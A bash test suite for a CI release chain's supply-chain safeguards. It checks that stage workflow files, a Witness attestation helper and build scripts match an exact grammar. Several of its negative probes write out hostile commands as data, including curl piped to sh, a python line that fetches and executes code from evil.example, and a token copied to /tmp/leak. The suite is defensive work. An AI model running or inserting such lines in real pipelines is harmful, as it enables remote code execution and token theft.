#!/usr/bin/env bash
# proves: REQ-CHAIN-004-AC1, REQ-CHAIN-004-AC2, REQ-CHAIN-004-AC3, REQ-CHAIN-004-AC6, REQ-CHAIN-004-AC8, REQ-CHAIN-004-AC9,
#         REQ-CHAIN-004-AC10 (the flags; PR 1's verify cases cover the identity), REQ-CHAIN-004-AC11, REQ-CHAIN-005-AC1, REQ-CHAIN-005-AC2,
#         REQ-CHAIN-005-AC4, REQ-CHAIN-005-AC5, REQ-CHAIN-005-AC6
# RED until PR 2 is implemented (stage-build.yml / stage-reproducibility.yml rewritten, bin/build-stage-KIND.sh x4, bin/chain-verify.py
# record-env, items-apk, items-merge, bind, bin/install-scanner.sh witness): tests first, step 4. Fix round 1 after step-6 round 1 (Opus 7 + Sonnet 11).
#
# Build and Rebuild, static half and the stage scripts' behaviour (v0.3.0 rules 24, 31, 38a, 38b, 39, 50, 51, 54, 58, 59, 62, 63, 68, 70).
# Runs on ubuntu-24.04 or macOS with: bash, python3 + PyYAML (apt: python3-yaml), jq, shasum. No network, no secrets, no keys.
#
# DESIGN RULE (the lesson of PR 1, ten lost review rounds): no denylists, no shell analysis, no subsequence checks. Every judge in
# bin/chain-test-shape.py is a FINITE EXACT GRAMMAR: a stage file is exactly the steps of its table, a stage script is exactly the
# lines of expected_lines(KIND), release.yml's chain jobs are exactly the allowed keys and targets. Anything else is a fault by
# construction. The judges are proven on a known-good fixture, by named probes (every probe of the two step-6 reports) and by sweeps
# (delete any line, swap any two neighbours, append a suffix to any line, insert a probe after any line), then applied to the real tree.
#
# THE SHAPE (ratified Oct 9, owner, rule 50 wording: one stage = one workflow file = one identity; Build's two-machine matrix plus its assemble job fit):
#   stage-build.yml: job `apk` (a matrix over ubuntu-24.04 and ubuntu-24.04-arm: bin/build-stage-apk.sh) and job `assemble` (the ubuntu-24.04 VM,
#   needs apk: bin/build-stage-assemble.sh); stage-reproducibility.yml: the same two jobs (bin/build-stage-rebuild-apk.sh and -rebuild-assemble.sh).
#   Four SCRIPTS, one per kind, so no dispatch exists to analyse; each is listed in .github/policy/chain-scripts.json (PR 1's design) with its sha256.
#   Each job: checkout (digest-pinned, on the allowed-actions list, persist-credentials false, fetch-depth 0, fetch-tags true) -> ./bin/install-scanner.sh
#   witness -> the downloads (exact name AND path, each into its own fresh directory) -> ONE Witness step -> the uploads (exact name AND path).
#   No `-d`: the command runs from the repo root, so Witness names its product subjects relative to the repo root. digests.json and items.json are
#   written at the repo root, so their subjects are file:digests.json (PR 1's sign --check contract, REQ-CHAIN-001-AC2: PR 1 OWNS that schema) and
#   file:items.json (bin/chain-rebuild-test.sh's rebuild-compare contract); the Witness record itself is -o witness-build/build-collection.json.
#   DEVIATION FROM THE FIX-ROUND BRIEF, STATED: the brief said witness-build/digests.json and witness-build/items.json; PR 1's reviewed contract names
#   file:digests.json, so the files sit at the repo root instead of changing PR 1.
#
# THE WITNESS SEAM (advisor ruling): the judge for how the stage runs the script under `witness run` is ONE function, witness_seam in
# bin/chain-test-shape.py, and the fixture side is ONE function, witness_block below. If harness spike (d) (Fulcio's 10-minute certificate against a
# >12-minute build) fails and the wrapping changes (option (i) witness wraps only short steps; (ii) a second witness run signs a record of the first),
# only witness_seam and witness_block should need to change; the script grammar does not name Witness.
#
# CACHE'S INTERFACE (cache-3f's note ops/handoffs/outbox/2026-10-09-cache-pipeline-interface.md; [F] = fixed by a cache test, [P] = PROPOSED/UNVERIFIED):
#   ./bin/build-apk.sh --print-source-date-epoch --source-dir DIR   [F] digits only
#   ./bin/build-apk.sh --variant standard|fips --arch A --version X.Y.Z --source-dir DIR --repo DIR --keyring FILE --go-archive DIR --melange-lock FILE
#                      --out DIR [F L665-666]; SOURCE_DATE_EPOCH digits required [F]; refuses APK_RELEASE_SIGNING_KEY, GOPROXY other than off, HTTPS_PROXY,
#                      --signing-key [F]; exit 0 / 2 named refusal / 4 network attempt in the sealed call / other non-zero [F, UPDATE I3b]
#   ./bin/assemble-image.sh --variant production|fips --version X.Y.Z --archive DIR --melange-repo DIR --keyring-dir DIR --out DIR [--apko-config FILE]
#                      [--base-lock FILE] [--render-dir DIR] [F L867-868]; the config defaults to build/apko.yaml | build/apko-fips.yaml, so NO --apko-config
#                      is ever passed (the fixed relative path, AC11 (B)); outputs OUT/V.digest (OCI index digest), V.manifests, V.tar, V.full.lock.json [F]
#   the SCRIPTS do their own sudo sysctl / sudo unshare -n around melange and apko [F]; the stage does not.
#   [P] the archive layout constants (ARCHIVE, GO_ARCHIVE, KEYRING_WOLFI, MELANGE_LOCK, ASSEMBLY_PUB in bin/chain-test-shape.py), `bin/apk-tool.py cat APK
#   usr/bin/fscache` for the binary (the binary path inside the fips apk), `bin/build-archives.py` (this lane's: the Linux archives from the apks), the
#   items layout (bin/chain-test-harness.py documents it), and whether sudo's PATH finds melange/apko on a runner.
#
# THE CLI OF bin/chain-verify.py THAT THE STAGE SCRIPTS USE (this lane adds bind, items-apk, items-merge, rebuild-compare, record-env; PR 1 owns the rest):
#   policy make --template T --tag TAG --out policy.json         (PR 1)
#   verify --stage S --record R --policy P                       (PR 1)
#   stage-start --stage rebuild --previous build --record R --digests D --policy P   (PR 1)
#   bind --stage S --record R --policy P --file F --as NAME      exit 1 "digest" unless sha256(F) is the sha256 Witness recorded in R for the product
#                                                                subject file:NAME (rule 58: the bytes the job uses are the bytes the verified record covers)
#   items-apk --out-dir DIR --arch A --version V --result FILE   this job's items fragment (PROPOSED layout, bin/chain-test-harness.py)
#   items-merge --fragment F... --images DIR --archive DIR [--digests FILE] --items FILE   merge the fragments (refusing disagreement), add the image,
#                                                                lock, SBOM and archive items; --digests writes digests.json (PR 1's schema)
#   rebuild-compare --build-record R --expected E --actual A --out VERDICT     (bin/chain-rebuild-test.sh)
#   record-env --record R                                        no token variable in a Witness collection (REQ-CHAIN-004-AC8)
# The GH_TOKEN for bin/build-admit.py reaches ONLY the admission job's Witness step (env: GH_TOKEN: ${{ github.token }}, job permissions exactly contents,
# checks, statuses, pull-requests read + id-token write), is on Witness's sensitive-key list, and is refused in the record (advisor ruling, Oct 9: confirmed).
# KNOWN LIMIT (PROPOSED/UNVERIFIED, no static test can prove it; the dry run decides): Witness loads its Fulcio signer when the command starts and the
# timestamp is taken when it ends, so a build longer than Fulcio's 10-minute certificate may not verify (harness spike (d), advisor question).
# INTEGRATION BRANCH (advisor 0341): PR 2 targets chain-v030, not main; the real-tree cases below are RED here and become green on chain-v030 after PR 1
# and PR 2 merge there; the old chain stays live on main until the cutover PR.
set -euo pipefail
root=$(cd "$(dirname "$0")/.." && pwd)
shape="$root/bin/chain-test-shape.py"; harness="$root/bin/chain-test-harness.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL PyYAML is required (apt: python3-yaml)"; exit 1; }
ok()  { pass=$((pass + 1)); echo "ok   $1"; }
bad() { failn=$((failn + 1)); echo "FAIL $1"; }
judge() { python3 "$shape" "$@"; }
expect() { # expect ok|caught LABEL WORD args...  (WORD: a word the fault message must contain, for caught)
  local want=$1 label=$2 word=$3; shift 3; local out rc=0
  out=$(judge "$@" 2>&1) || rc=$?
  if [ "$want" = ok ]; then
    if [ "$rc" = 0 ]; then ok "$label"; else bad "$label -> $out"; fi
  else
    if [ "$rc" = 1 ] && grep -Fq -- "$word" <<< "$out" && ! grep -q Traceback <<< "$out"; then ok "$label (caught: ${out:0:90})"; else bad "$label -> rc=$rc, wanted a refusal containing '$word': ${out:0:160}"; fi
  fi
}
mutate() { # mutate SRC DST REGEX REPLACEMENT   (a pattern that no longer matches is a FAILURE, never a skipped case)
  python3 - "$1" "$2" "$3" "$4" <<'PY' || { bad "mutation did not apply ($(basename "$2")): $3"; return 1; }
import re, sys
t = open(sys.argv[1]).read()
n = re.sub(sys.argv[3], sys.argv[4].replace("\\n", "\n"), t, count=1, flags=re.S)
assert n != t, "mutation did not change the fixture"
open(sys.argv[2], "w").write(n)
PY
}
mutatel() { # mutatel SRC DST OLD NEW  (fixed strings)
  python3 - "$1" "$2" "$3" "$4" <<'PY' || { bad "literal mutation did not apply: $3"; return 1; }
import sys
t = open(sys.argv[1]).read(); n = t.replace(sys.argv[3], sys.argv[4].replace("\\n", "\n"), 1)
assert n != t, "mutation did not change the fixture"
open(sys.argv[2], "w").write(n)
PY
}
# ---- known-good fixtures. THE FIXTURE SIDE OF THE WITNESS SEAM is witness_block -------------------------------------------------------
python3 - "$work" "$shape" <<'PY'
import importlib.util, json, sys
w, shape = sys.argv[1:3]
spec = importlib.util.spec_from_file_location("shape", shape); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
CHK = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
UPL = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"
DWN = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65"
json.dump({"actions": [CHK, UPL, DWN]}, open(w + "/allowed-actions.json", "w"))

def witness_block(spec_):   # THE FIXTURE SIDE OF THE RULE 68 SEAM (1/2): the stage's Witness step is one line through the helper
    env = "        env:\n          GH_TOKEN: ${{ github.token }}\n" if spec_["gh"] else ""
    return f"      - name: {spec_['step']} under Witness\n{env}        run: bash bin/witnessed.sh {spec_['step']} bin/build-stage-{spec_['kind']}.sh\n"

def witnessed_text():       # THE FIXTURE SIDE OF THE RULE 68 SEAM (2/2): bin/witnessed.sh, the long exec line broken at its flag groups for a human reader
    import re
    ls = S.witnessed_lines()
    ls[-1] = re.sub(r" (--signer-fulcio-url|--signer-fulcio-oidc-issuer|--signer-fulcio-oidc-client-id|--signer-fulcio-token-path|-t |-a |--env-filter-sensitive-vars|--env-add-sensitive-key 'ACTIONS|--env-add-sensitive-key GH|-o )", r" \\\n  \1", ls[-1])
    return "#!/usr/bin/env bash\n# run one stage script under Witness: keyless Fulcio, the timestamp authority, the attestors, `timeout 540` (rule 68)\n" + "\n".join(ls) + "\n"
open(w + "/witnessed.sh", "w").write(witnessed_text())

def perm(p): return "    permissions:\n" + "".join("      %s: %s\n" % kv for kv in p.items())
def stage_text(fam):
    out = "name: 'Stage: %s'\non:\n  workflow_call:\npermissions:\n  contents: read\njobs:\n" % fam
    for jn in ("apk", "assemble"):
        sp = S.JOBS[(fam, jn)]
        out += f"  {jn}:\n"
        out += ("    runs-on: ${{ matrix.runner }}\n    strategy:\n      matrix:\n        runner: [ubuntu-24.04, ubuntu-24.04-arm]\n" if sp["matrix"]
                else "    needs: apk\n    runs-on: ubuntu-24.04\n") + perm(sp["perm"]) + "    steps:\n"
        out += f"      - uses: {CHK} # v7.0.1\n        with:\n          persist-credentials: false\n          fetch-depth: 0\n          fetch-tags: true\n"
        out += "      - name: install Witness (pinned by checksum)\n        run: ./bin/install-scanner.sh witness\n"
        for nm, p in sp["down"]: out += f"      - uses: {DWN} # v5.0.0\n        with:\n          name: {nm}\n          path: {p}\n"
        out += witness_block(sp)
        for nm, ps in sp["up"]: out += f"      - uses: {UPL} # v7.0.1\n        with:\n          name: {nm}\n          path: |\n" + "".join("            %s\n" % x for x in ps)
    return out
open(w + "/build.yml", "w").write(stage_text("build"))
open(w + "/rebuild.yml", "w").write(stage_text("rebuild"))
import subprocess
for k in ("apk", "assemble", "rebuild-apk", "rebuild-assemble"):
    open("%s/s-%s.sh" % (w, k), "w").write("#!/usr/bin/env bash\n" + "\n".join(S.expected_lines(k)) + "\n")
json.dump({"scripts": [{"path": p, "sha256": __import__("hashlib").sha256(open(w + "/witnessed.sh" if k == "witnessed" else "%s/s-%s.sh" % (w, k), "rb").read()).hexdigest(), "tools": []} for k, p in S.SCRIPTS.items()]}, open(w + "/chain-scripts.json", "w"))
PY
cat > "$work/release.yml" <<'EOF'
name: Release
on:
  push:
    tags: ["v*"]
jobs:
  build:
    uses: ./.github/workflows/stage-build.yml
  sign:
    needs: build
    uses: ./.github/workflows/stage-sign.yml
  rebuild:
    needs: build
    uses: ./.github/workflows/stage-reproducibility.yml
  check:
    needs: build
    uses: ./.github/workflows/stage-verify.yml
  release:
    needs: [rebuild, check, sign]
    uses: ./.github/workflows/stage-promote.yml
  decide:
    runs-on: ubuntu-latest
    steps: []
EOF
# ---- the stage-file judge (REQ-CHAIN-004-AC1, AC2; REQ-CHAIN-005-AC1, AC4) -----------------------------------------------------------
AL="$work/allowed-actions.json"
expect ok     "AC1/AC2 fixture: the known-good Build stage file (apk matrix + assemble) passes" "" stage "$work/build.yml" build "$AL"
expect ok     "005-AC1 fixture: the known-good Rebuild stage file passes" "" stage "$work/rebuild.yml" rebuild "$AL"
m() { mutate "$work/build.yml" "$work/$1.yml" "$2" "$3"; }
st() { local n=$1 label=$2 word=$3 re=$4 rep=$5; m "$n" "$re" "$rep" && expect caught "$label" "$word" stage "$work/$n.yml" build "$AL"; return 0; }
st s_cont  "AC1 a container on the assemble job (rule 62)" container 'runs-on: ubuntu-24.04\n    permissions' 'runs-on: ubuntu-24.04\n    container: debian:12\n    permissions'
st s_svc   "AC1 services on a job" services 'runs-on: ubuntu-24.04\n    permissions' 'runs-on: ubuntu-24.04\n    services:\n      db: {image: x}\n    permissions'
st s_self  "AC1 a self-hosted runner in the matrix" matrix 'ubuntu-24.04-arm\]' 'self-hosted]'
st s_third "AC1 a third runner in the matrix" matrix 'ubuntu-24.04-arm\]' 'ubuntu-24.04-arm, ubuntu-22.04]'
st s_one   "AC1 only one native runner (both architectures are required)" matrix 'runner: \[ubuntu-24.04, ubuntu-24.04-arm\]' 'runner: [ubuntu-24.04]'
st s_incl  "AC1 an include entry in the matrix (an emulated or extra runner)" matrix 'runner: \[ubuntu-24.04, ubuntu-24.04-arm\]' 'runner: [ubuntu-24.04, ubuntu-24.04-arm]\n        include:\n          - runner: ubuntu-22.04'
st s_asmr  "AC1 the assemble job on the arm runner" "assemble job must run directly on" 'assemble:\n    needs: apk\n    runs-on: ubuntu-24.04' 'assemble:\n    needs: apk\n    runs-on: ubuntu-24.04-arm'
st s_need  "AC1 the assemble job does not need the apk jobs" "must need exactly apk" 'needs: apk' 'needs: []'
st s_env   "AC1 job-level env" env 'permissions:\n      contents: read\n      checks' 'env:\n      A: b\n    permissions:\n      contents: read\n      checks'
st s_def   "AC1 job-level defaults (a shell override)" defaults 'permissions:\n      contents: read\n      id-token: write\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n          fetch-depth: 0\n          fetch-tags: true\n      - name: install Witness \(pinned by checksum\)\n        run: ./bin/install-scanner.sh witness\n      - uses: actions/download-artifact' 'defaults:\n      run:\n        shell: bash -c "x; bash {0}"\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n          fetch-depth: 0\n          fetch-tags: true\n      - name: install Witness (pinned by checksum)\n        run: ./bin/install-scanner.sh witness\n      - uses: actions/download-artifact'
st s_pkg   "AC1 packages: write" permissions 'id-token: write' 'id-token: write\n      packages: write'
st s_noid  "AC1 no id-token (Witness cannot sign keyless)" permissions '      id-token: write\n    steps' '    steps'
st s_nochk "AC1 the admission job without checks: read (the required-checks check could not run)" permissions '      checks: read\n' ''
st s_wfperm "AC1 workflow-level permissions beyond contents: read" permissions 'permissions:\n  contents: read\njobs' 'permissions:\n  contents: write\njobs'
st s_push  "AC1 an extra trigger" workflow_call 'workflow_call:' 'push:\n  workflow_call:'
st s_job3  "AC1 a third job (one stage = one file = two jobs)" "exactly two jobs" '  assemble:' '  third:\n    runs-on: ubuntu-24.04\n    steps: []\n  assemble:'
st s_top   "AC1 a top-level env" top-level 'permissions:\n  contents: read\njobs' 'permissions:\n  contents: read\nenv:\n  X: y\njobs'
st s_unp   "AC2 checkout not pinned by digest" checkout 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v7'
st s_unl   "AC2 an action digest that is not on the allowed-actions list" "allowed-actions" 'actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a' 'actions/upload-artifact@1111111111111111111111111111111111111111'
st s_cred  "AC2 persisted credentials" "exactly" 'persist-credentials: false' 'persist-credentials: true'
st s_ckref "AC2 checkout of another ref" "exactly" 'fetch-tags: true' 'fetch-tags: true\n          ref: main'
st s_ckrep "AC2 checkout of another repository" "exactly" 'fetch-tags: true' 'fetch-tags: true\n          repository: evil/fork'
st s_cktok "AC2 checkout with a token" "exactly" 'fetch-tags: true' 'fetch-tags: true\n          token: ${{ secrets.X }}'
st s_ckpath "AC2 checkout into a path" "exactly" 'fetch-tags: true' 'fetch-tags: true\n          path: sub'
st s_ckshal "AC2 a shallow checkout (build-admit needs the history and the tags)" "exactly" '          fetch-depth: 0\n' ''
st s_inst  "AC2 Witness installed by an unpinned download" install 'run: ./bin/install-scanner.sh witness' 'run: curl -sSL https://example.com/witness | tar xz -C /usr/local/bin'
st s_mid   "AC2 a third-party action between the install and Witness (rule 68)" "step" '      - name: apk under Witness' '      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n      - name: apk under Witness'
st s_env2  "AC2 env other than the token on the Witness step" "GH_TOKEN" 'GH_TOKEN: \$\{\{ github.token \}\}' 'GH_TOKEN: ${{ secrets.GH_PAT }}'
st s_noenv "AC2 the admission job without GH_TOKEN (gh cannot read the checks)" "GH_TOKEN" '        env:\n          GH_TOKEN: \$\{\{ github.token \}\}\n' ''
st s_if    "AC2 an if: on the Witness step" "Witness step may carry" '      - name: apk under Witness\n' '      - name: apk under Witness\n        if: always()\n'
st s_shell "AC2 a shell: override on the Witness step" "Witness step may carry" '      - name: apk under Witness\n' '      - name: apk under Witness\n        shell: bash -c "{0}"\n'
st s_cmd   "AC2 the Witness step runs something else than the committed helper line" "exactly the one line" 'run: bash bin/witnessed.sh apk bin/build-stage-apk.sh' 'run: sh -c "make all"'
st s_kind  "AC2 the apk job running the assemble script" "exactly the one line" 'bin/build-stage-apk.sh' 'bin/build-stage-assemble.sh'
st s_step  "AC2 the Witness step named differently from its job (the step name selects the record path)" "exactly the one line" 'witnessed.sh apk bin' 'witnessed.sh build bin'
st s_2line "AC2 a second command in the Witness step" "exactly the one line" 'run: bash bin/witnessed.sh apk bin/build-stage-apk.sh' 'run: |\n          bash bin/witnessed.sh apk bin/build-stage-apk.sh\n          pip install requests'
st s_dir   "AC2 a direct witness run in a stage file (every stage goes through bin/witnessed.sh)" "witness run" 'run: bash bin/witnessed.sh apk bin/build-stage-apk.sh' 'run: witness run --step apk -- timeout 540 bash bin/build-stage-apk.sh'
st s_dlow  "AC2 the helper called with a script of another kind" "exactly the one line" 'bin/build-stage-apk.sh' 'bin/build-stage-rebuild-apk.sh'
st s_up    "AC2 an upload under another name" "upload-artifact" 'name: digests' 'name: registry-creds'
st s_upp   "AC2 an upload of the runner temp folder (it holds the identity token)" "upload-artifact" '            digests.json' '            ${{ runner.temp }}'
st s_updot "AC2 an upload of the whole workspace" "upload-artifact" '            digests.json' '            .'
st s_upx   "AC2 an upload with an extra with: key" "upload-artifact" 'name: items\n          path: \|' 'name: items\n          retention-days: 90\n          path: |'
st s_upw   "AC2 an upload that tolerates a missing file" "upload-artifact" 'name: digests\n          path: \|' 'name: digests\n          if-no-files-found: ignore\n          path: |'
st s_uplock "AC2 the locks upload missing one lock (the full lock of each variant travels, rule 37)" "upload-artifact" '            out/fips.full.lock.json\n' ''
st s_upmiss "AC2 a required upload missing (dist)" "steps" '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: dist\n          path: \|\n            dist\n' ''
mutate "$work/build.yml" "$work/s_upext2.yml" '(      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: images\n          path: \|\n            out/production.tar\n            out/fips.tar\n)' '\1      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: extra\n          path: |\n            out\n' \
  && expect caught "AC2 an extra upload step after the allowed ones" "no extra step" stage "$work/s_upext2.yml" build "$AL"
st s_dlx   "AC2 a download of a name outside the table" "download-artifact" 'name: apk-ubuntu-24.04\n          path: apk-in/ubuntu-24.04' 'name: dist\n          path: apk-in/ubuntu-24.04'
st s_dlbad "AC2 a download not pinned by digest" "download-artifact" 'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65' 'actions/download-artifact@v5'
st s_dldot "AC2 a download into . (a tampered artifact could overwrite committed scripts)" "download-artifact" 'path: apk-in/ubuntu-24.04\n' 'path: .\n'
st s_dlbin "AC2 a download into bin/ (it would replace the scripts)" "download-artifact" 'path: apk-in/ubuntu-24.04\n' 'path: bin\n'
st s_dlgh  "AC2 a download into .github/" "download-artifact" 'path: apk-in/ubuntu-24.04\n' 'path: .github\n'
st s_dlswp "AC2 both architectures downloaded into the SAME directory (the amd64 apk could feed arm64)" "download-artifact" 'path: apk-in/ubuntu-24.04-arm\n' 'path: apk-in/ubuntu-24.04\n'
st s_dlmis "AC2 the arm apk download missing" "steps" '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65 # v5.0.0\n        with:\n          name: apk-ubuntu-24.04-arm\n          path: apk-in/ubuntu-24.04-arm\n' ''
st s_dlxk  "AC2 a download with an extra with: key (run-id / github-token / repository pulls another run's artifact)" "download-artifact" 'name: apk-ubuntu-24.04\n          path: apk-in/ubuntu-24.04' 'name: apk-ubuntu-24.04\n          run-id: 1\n          path: apk-in/ubuntu-24.04'
st s_dlapk "AC2 the Build apk job downloads something (it takes nothing from outside)" "steps" '      - name: apk under Witness' '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65 # v5.0.0\n        with:\n          name: witness-build\n          path: x\n      - name: apk under Witness'
st s_act   "AC2 a third-party action after Witness" "step" '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: digests' '      - uses: actions/cache@0000000000000000000000000000000000000000 # v4\n        with:\n          name: digests'
st s_comp  "AC2 a local composite action step" "step" '      - name: apk under Witness' '      - uses: ./.github/actions/x\n      - name: apk under Witness'
st s_dock  "AC2 a docker:// step" "step" '      - name: apk under Witness' '      - uses: docker://alpine:3\n      - name: apk under Witness'
st s_jobuses "AC1 a job that calls a reusable workflow instead of running steps" uses 'assemble:\n    needs: apk' 'assemble:\n    uses: ./.github/workflows/ci.yml\n    needs: apk'
st s_to    "AC1 an unknown job key (timeout is fine, concurrency is not)" "outside the allowlist" 'assemble:\n    needs: apk' 'assemble:\n    concurrency: x\n    needs: apk'
mutate "$work/rebuild.yml" "$work/r_step.yml" 'witnessed.sh rebuild bin' 'witnessed.sh build bin'   && expect caught "005-AC1 Rebuild's assemble Witness step is named build (Build's record path)" "exactly the one line" stage "$work/r_step.yml" rebuild "$AL"
mutate "$work/rebuild.yml" "$work/r_up.yml" 'name: witness-rebuild' 'name: dist'    && expect caught "005-AC4 Rebuild uploads anything but its verdict directory" "upload-artifact" stage "$work/r_up.yml" rebuild "$AL"
mutate "$work/rebuild.yml" "$work/r_dl.yml" 'name: witness-build\n          path: witness-build' 'name: dist\n          path: witness-build' && expect caught "005-AC4 Rebuild downloads Build's dist (it publishes nothing and takes only the record and the lists)" "download-artifact" stage "$work/r_dl.yml" rebuild "$AL"
mutate "$work/rebuild.yml" "$work/r_gh.yml" '      - name: rapk under Witness' '      - name: rapk under Witness\n        env:\n          GH_TOKEN: ${{ github.token }}' && expect caught "005-AC1 a GH_TOKEN on Rebuild (only the admission job holds it)" "env" stage "$work/r_gh.yml" rebuild "$AL"
mutate "$work/rebuild.yml" "$work/r_perm.yml" 'id-token: write' 'id-token: write\n      checks: read' && expect caught "005-AC1 Rebuild with the admission permissions" permissions stage "$work/r_perm.yml" rebuild "$AL"
mutate "$work/build.yml" "$work/r_kind.yml" 'build-stage-apk.sh' 'build-stage-rebuild-apk.sh' && expect caught "005-AC1 Build running the rebuild script" "exactly the one line" stage "$work/r_kind.yml" build "$AL"
expect caught "AC1 an unreadable allowed-actions list fails closed" "unreadable" stage "$work/build.yml" build "$work/does-not-exist.json"
# ---- the Witness seam: bin/witnessed.sh is the only place the Witness flags and `timeout 540` live (REQ-CHAIN-004-AC2; rule 68 as amended) -----
expect ok     "AC2 fixture: the known-good bin/witnessed.sh (the long exec line broken at its flag groups) is exactly the canonical helper" "" helper "$work/witnessed.sh"
expect ok     "AC2 fixture: no stage file and no stage script names witness run" "" directwitness "$work/build.yml" "$work/rebuild.yml" "$work/s-apk.sh" "$work/s-assemble.sh" "$work/s-rebuild-apk.sh" "$work/s-rebuild-assemble.sh"
hm() { local n=$1 label=$2 old=$3 new=$4; mutatel "$work/witnessed.sh" "$work/h_$n.sh" "$old" "$new" && expect caught "$label" "helper command" helper "$work/h_$n.sh"; return 0; }
hm tnone  "AC2 the helper without timeout (a build could outlive Fulcio's 10-minute certificate)" '-- timeout 540 bash "$@"' '-- bash "$@"'
hm t600   "AC2 timeout 600 (past the certificate's life)" '-- timeout 540' '-- timeout 600'
hm t0     "AC2 timeout 0 (no limit)" '-- timeout 540' '-- timeout 0'
hm tvar   "AC2 the limit from a variable" '-- timeout 540' '-- timeout "$T"'
hm tbefore "AC2 the timeout wrapped around Witness instead of the command (the certificate is requested before it starts)" 'exec witness run' 'exec timeout 540 witness run'
hm tsh    "AC2 the timeout without bash (a script path run directly)" 'timeout 540 bash "$@"' 'timeout 540 "$@"'
hm furl   "AC2 another Fulcio address" 'https://fulcio.sigstore.dev' 'http://fulcio.evil.example'
hm ftsa   "AC2 another timestamp authority" 'https://timestamp.sigstore.dev/api/v1/timestamp' 'https://tsa.example/ts'
hm fd     "AC2 witness -d (the command must run from the repo root, so subjects are named from it)" '-o "witness-$step' '-d out -o "witness-$step'
hm fx     "AC2 an extra Witness flag" '--env-filter-sensitive-vars' '--enable-archivista --env-filter-sensitive-vars'
hm fflt   "AC8 no environment filter flag (tokens would be recorded)" '--env-filter-sensitive-vars' ''
hm fkey   "AC8 no token-variable key pattern" "--env-add-sensitive-key 'ACTIONS_ID_TOKEN_REQUEST*'" ''
hm fgh    "AC8 GH_TOKEN not on the sensitive-key list (the admission token would be recorded)" '--env-add-sensitive-key GH_TOKEN' ''
hm fslsa  "AC2 the slsa attestor (provenance is Sign's alone)" 'environment,git,material,product' 'environment,git,material,slsa'
hm fgha   "AC8 the github attestor (it embeds the raw OIDC token)" 'environment,git,material,product' 'environment,git,github,material,product'
hm fstep  "AC2 a fixed --step instead of the closed-list argument" '--step "$step"' '--step build'
hm fout   "AC2 the record written to another path" '"witness-$step/$step-collection.json"' 'out/x.json'
hm fcase  "AC2 the step list is open (the closed-list check removed)" 'apk|build|rapk|rebuild' '*'
hm fcase2 "AC2 another step name on the closed list" 'apk|build|rapk|rebuild' 'apk|build|rapk|rebuild|extra'
hm fexec  "AC2 witness not exec'd (its exit status could be lost)" 'exec witness run' 'witness run'
hm ftok   "AC2 the token fetch writes the token elsewhere" 'jq -r .value "$RUNNER_TEMP/tok.json" > "$RUNNER_TEMP/tok"' 'jq -r .value "$RUNNER_TEMP/tok.json" | tee /tmp/leak > "$RUNNER_TEMP/tok"'
hm fmk    "AC2 the record directory is not created" 'mkdir -p "witness-$step"' ':'
hm fpipe  "AC2 a failure of the witnessed command is ignored" '-- timeout 540 bash "$@"' '-- timeout 540 bash "$@" || true'
python3 - "$work" <<'PY'
w = sys.argv[1] if False else __import__("sys").argv[1]
t = open(w + "/witnessed.sh").read(); open(w + "/h_second.sh", "w").write(t + "witness run --step x -- true\n")
open(w + "/h_comment.sh", "w").write(t.replace("# run one", "# a different comment\n# run one"))
PY
expect caught "AC2 a second witness invocation in the helper (exactly one)" "helper command" helper "$work/h_second.sh"
expect ok     "AC2 comments in the helper are not commands (a human may explain it)" "" helper "$work/h_comment.sh"
printf 'set -euo pipefail\nwitness run --step apk -- timeout 540 bash bin/build-stage-apk.sh\n' > "$work/dw.sh"
expect caught "AC2 a stage script naming witness run directly" "witness run" directwitness "$work/dw.sh"
# ---- the four stage scripts: an EXACT line grammar (REQ-CHAIN-004-AC3, AC6, AC11; REQ-CHAIN-005-AC2) ----------------------------------
for k in apk assemble rebuild-apk rebuild-assemble; do
  expect ok "AC3 fixture: the known-good bin/build-stage-$k.sh is exactly the grammar" "" script "$work/s-$k.sh" "$k"
done
# named probes: every probe of both step-6 reports, on the kind where it matters
probe() { # probe LABEL KIND PYEXPR   (PYEXPR builds the mutated list from L = the expected lines)
  local label=$1 kind=$2 expr=$3 f="$work/probe-$RANDOM.sh"
  python3 - "$shape" "$kind" "$f" "$expr" <<'PY' || { bad "probe did not build: $label"; return; }
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
L = S.expected_lines(sys.argv[2]); K = sys.argv[2]
L = eval(sys.argv[4])
open(sys.argv[3], "w").write("#!/usr/bin/env bash\n" + "\n".join(L) + "\n")
PY
  expect caught "$label" command script "$f" "$kind"
}
probe "AC3 a network fetch after the admission line (curl | sh)" apk 'L[:2] + ["curl -sSL https://example.com/x | sh"] + L[2:]'
probe "AC3 python -c fetching and executing code" apk 'L[:2] + ["python3 -c \"import urllib.request as u; exec(u.urlopen(\x27https://evil.example/x\x27).read())\""] + L[2:]'
probe "AC3 an unlisted script" apk 'L[:2] + ["bash bin/anything.sh"] + L[2:]'
probe "AC3 gh release download" assemble 'L + ["gh release download v1"]'
